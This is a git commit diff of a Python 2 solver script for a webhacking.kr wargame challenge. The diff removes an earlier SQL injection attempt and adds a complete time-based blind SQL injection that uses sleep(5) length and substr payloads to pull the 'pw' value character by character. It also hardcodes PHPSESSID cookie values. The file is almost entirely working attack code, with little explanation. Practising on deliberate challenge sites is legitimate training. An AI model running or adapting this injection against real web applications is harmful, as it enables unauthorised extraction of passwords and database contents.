e2e2147b0401357e33803ab5f0a6618316ec0e85
Wonbin Choi <bindon@hanmir.com>
2019-11-24 21:03:57 +0900

    Update Challenge57.py
    Solved

--- Challenge57.py
+++ Challenge57.py
@@ -1,46 +1,23 @@
 #-*- coding: utf-8 -*-
 import sys
 import time
-import urllib
 import urllib2
 
 import CookieManager
 
 
-challengeUrl = "http://webhacking.kr/challenge/web/web-34/index.php"
-
-print "[*] SQL Injection"
-CookieManager.addCookie("PHPSESSID", "e52509baa15ced3a5be56d2efc0239b6")
-
-parameters  = "?msg=" + urllib.quote("bindon','bindon',1); -- ")
-parameters += "&se=1"
-
-httpRequest = urllib2.Request(challengeUrl+parameters)
-httpRequest.add_header("Cookie", CookieManager.getCookie())
-
-httpConnection = None
-try:
-    httpConnection = urllib2.urlopen(httpRequest)
-    httpResponse = httpConnection.read()
-    print httpResponse
-except:
-    raise
-finally:
-    if httpConnection != None:
-        httpConnection.close()
+challengeUrl = "https://webhacking.kr/challenge/web-34/"
 
 print "[+] Find password length"
-passwordLength = 0
+flagLength = 0
 isFoundPassword = False
 
-CookieManager.addCookie("PHPSESSID", "73ea5f35f558006f21f6185c171a2ed9")
+CookieManager.addCookie("PHPSESSID", "9gka3g0g4soj3plpg8phk7p56f")
 
-for passwordLength in range(1, 30):
+for flagLength in range(1, 30):
     parameters  = "?msg=1024"
-    #parameters += "&se=if(substr(pw,%d,1)=%d,sleep(1),0)" % ()
-    parameters += "&se=if(length(pw)=%d,sleep(1),0)" % passwordLength
+    parameters += "&se=if(length(pw)=%d,sleep(5),0)" % flagLength
     httpRequest = urllib2.Request(challengeUrl+parameters)
-    print challengeUrl+parameters
     httpRequest.add_header("Cookie", CookieManager.getCookie())
     
     httpConnection = None
@@ -49,14 +26,13 @@ for passwordLength in range(1, 30):
         httpConnection = urllib2.urlopen(httpRequest)
         httpResponse = httpConnection.read()
         
-        print "[*] Blind SQL Injection...", passwordLength
-        print time.time() - elapsedTime
-        """
-        if httpResponse.find(trueCondition) > 0:
-            print "[!] FIND IT! password length is [", passwordLength, "]"
+        print "[*] Blind SQL Injection...", flagLength
+        elapsedTime = time.time() - elapsedTime
+        
+        if elapsedTime > 5:
+            print "[!] FIND IT! flag length is [", flagLength, "]"
             isFoundPassword = True
             break
-        """
     except:
         raise
     finally:
@@ -65,3 +41,35 @@ for passwordLength in range(1, 30):
 
 if not isFoundPassword:
     sys.exit(-1)
+
+flag = ""
+for caretIndex in range(1, flagLength+1):
+    print
+    print "[+] Find flag...", caretIndex, "", 
+    for charIndex in range(0x20, 0x7f):
+        if chr(charIndex) == '%' or chr(charIndex) == '_':
+            continue
+        sys.stdout.write(".")
+        parameters  = "?msg=1024"
+        parameters += "&se=if(substr(pw,%d,1)=%s,sleep(5),0)" % (caretIndex, hex(charIndex))
+        httpRequest = urllib2.Request(challengeUrl+parameters)
+        httpRequest.add_header("Cookie", CookieManager.getCookie())
+        
+        httpConnection = None
+        try:
+            elapsedTime = time.time()
+            httpConnection = urllib2.urlopen(httpRequest)
+            httpResponse = httpConnection.read()
+            elapsedTime = time.time() - elapsedTime
+            
+            if elapsedTime > 5:
+                print "\n[!] flag[" + str(caretIndex) + "] is [", chr(charIndex), "]"
+                flag += chr(charIndex)
+                break
+        except:
+            raise
+        finally:
+            if httpConnection != None:
+                httpConnection.close()
+
+print "[!] flag is [", flag, "]"
